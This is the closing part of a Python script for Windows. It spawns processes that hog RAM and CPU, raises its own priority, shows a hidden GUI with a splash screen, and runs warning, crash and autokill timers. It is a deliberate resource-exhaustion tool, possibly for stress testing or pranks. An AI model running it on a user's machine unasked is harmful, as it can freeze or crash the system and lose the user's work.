        logging.info(f"[INFO] Autokill enabled. Will terminate processes and exit after {AUTOKILL_TIMER_MINUTES} minutes.")
        time.sleep(AUTOKILL_TIMER_MINUTES * 60)
        logging.info("[INFO] Autokill timer hit. Terminating hogs and exiting script.")
        for p in ram_processes + cpu_processes:
            if p.is_alive():
                p.terminate()
        ram_processes.clear()
        cpu_processes.clear()
        os._exit(0)

# ---------------- MAIN ----------------
if __name__ == '__main__':
    multiprocessing.freeze_support()
    ctypes.windll.kernel32.SetConsoleTitleW(SCRIPT_NAME)
    raise_priority()
    
    # Create GUI (it remains hidden initially)
    create_gui()
    
    # Show the splash screen if enabled
    if ENABLE_SPLASH_SCREEN:
        show_splash_screen(root)
    
    # Start threads
    threading.Thread(target=handle_hotkeys, daemon=True).start()
    spawn_ram_hogs()
    spawn_cpu_hogs()
    threading.Thread(target=warning_loop, daemon=True).start()
    threading.Thread(target=crash_timer, daemon=True).start()
    threading.Thread(target=autokill_timer, daemon=True).start()
    
    # Start GUI main loop
    root.mainloop()
